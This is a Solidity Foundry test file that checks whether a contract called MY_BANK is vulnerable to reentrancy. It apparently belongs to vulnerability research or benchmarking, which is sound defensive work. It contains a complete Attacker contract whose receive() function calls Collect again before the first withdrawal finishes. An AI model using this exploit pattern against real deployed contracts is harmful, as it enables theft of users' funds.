
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import "../src/MY_BANK.sol";

contract TestReentrancyMY_BANK is Test {

    MY_BANK public _contractUnderTest;

    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new MY_BANK(address(new Log(address(0))));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal >= 1 ether && attackVal <= type(uint128).max);

        vm.deal(address(_contractUnderTest), attackVal * 2);
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        _contractUnderTest.Put{value: attackVal}(block.timestamp + 100);
        vm.warp(block.timestamp + 200);

        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    MY_BANK public victim;

    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;

    uint256 public storedVal;

    constructor(address victimAddress) {
        victim = MY_BANK(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        storedVal = val;
    }

    function attack(uint256 val) public {
        initialSnapshot = victim.Acc(address(this)).balance;

        victim.Collect{value: 0}(val);

        if (victim.Acc(address(this)).balance < initialSnapshot) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {
            victim.Collect{value: 0}(storedVal);
            attackCallCount++;
        }
    }
}
